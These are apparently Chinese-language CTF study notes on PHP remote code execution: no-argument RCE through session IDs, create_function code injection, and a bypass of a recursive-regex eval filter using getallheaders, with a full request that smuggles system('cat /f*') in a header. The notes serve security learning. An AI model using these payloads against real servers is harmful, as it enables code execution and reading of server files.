
## 无参数rce
* [Ezrce](https://mp.weixin.qq.com/s/lTcijxa9eoWMm0TRKwJh_A)

```php
show_source(session_id(session_start()));

/*
// 请求
Cookie: PHPSESSID=/flag
...
Upgrade-Insecure-Requests:1

name=hahaha&qaq=show_source%28session_id%28session_start%28%29%29%29%3b
*/
```

## create_function 函数

`create_function` 函数根据传递的参数创建匿名函数，并为该匿名函数返回唯⼀的名称
函数语法: `string create_function(string $arges , string $code)`

```php
<?php
$id=$_GET['id'];
$code='echo'.$func.'test'.$id.'.';
create_function('$func',$code);
?>
```

`create_function` 函数会创建虚拟函数转变成如下代码

```php
<?php
$id=$_GET['id'];
function func($func){
    echo "test".$id;
}
```

当 id 传⼊`1;}phpinfo();/*`时 就可以造成代码执⾏
Payload:

`http://127.0.0.1/test.php?id=1;}phpinfo();/*`

拼接后为, 把后面都注释了。

```php
<?php
$id=$_GET['id'];
function func($func){
  echo "test".1;}phpinfo();/*;
}
?>
```

## `[^\W]+\((?R)?\)` bypass

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
    
}
// ?code=var_dump(get_defined_vars());&aaa=phpinfo()
```

- \w 匹配大小写字母、数字和下划线，
- \W 匹配非大小写字母、数字和下划线。
- `[^\W]` 为\W取反=\w。\(和\)匹配()
- (?R)递归匹配, aaa(bbb())，或aaa()。

进阶版
```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```
bp发包
```sh
GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarder-Proto: system('cat /f*');
Upgrade-Insecure-Requests: 1
```
解2
```sh
Paylaod:bo0g1pop.php?star=print_r(getallheaders()); 然后随便添加个参数：newstar=phpinfo();
?star=eval(array_rand(array_flip(getallheaders())));

array_reverse
array_flip()函数，它会将传进来的数组进行一个键和值的互换，这样的话phpinfo();就变成键了，
array_rand(),
```